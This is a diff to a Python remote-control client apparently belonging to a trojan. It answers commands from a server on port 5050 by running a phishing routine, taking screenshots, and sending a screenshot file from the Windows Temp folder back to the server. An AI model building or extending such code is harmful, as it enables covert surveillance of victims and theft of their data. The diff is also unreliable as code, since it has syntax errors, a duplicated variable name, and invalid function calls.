@@ -1,6 +1,8 @@
 
 import socket
 from main import get_ip,destroy,log,phis
+from numpy import asarray
+import cv2 as cv
 
 HEADER = 64
 port = 5050
@@ -33,3 +35,13 @@ while True:
         send(r)
     elif client.recv(HEADER).decode("utf-8")=="start phis"):
         phis()
+    elif client.recv(HEADER).decode("utf-8")=="pic"):
+        takeshot()
+    elif clientclient.recv(HEADER).decode("utf-8")=="send pic"):
+        try:
+            img = cv.imread("c:\\WINDOWS\\Temp\\logo.bmp",mode="RGB")
+            arr = asarray(img)
+            client.send("secret image123".encode("utf-8"))
+            client.send(arr.encode("utf-8"))
+        except:
+            client.send("first use pic cause there is no file like logo.bmp")
